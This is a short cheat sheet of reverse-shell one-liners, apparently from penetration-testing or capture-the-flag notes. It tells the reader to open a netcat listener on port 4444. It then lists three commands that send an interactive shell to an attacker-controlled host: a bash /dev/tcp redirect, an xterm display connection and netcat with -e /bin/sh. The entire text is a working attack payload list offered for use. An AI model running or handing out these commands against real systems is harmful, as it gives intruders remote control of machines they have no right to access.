To use any reverse shell here, open a connection on your machine: nc -lvnp 4444

Some variables you can try when it comes to reverse shell:

> bash -i >& /dev/tcp/192.168.0.1/8080 0>&1

> xterm -display 192.168.0.5:4444

> nc -e /bin/sh 192.168.0.5 4444



Good Lucky !
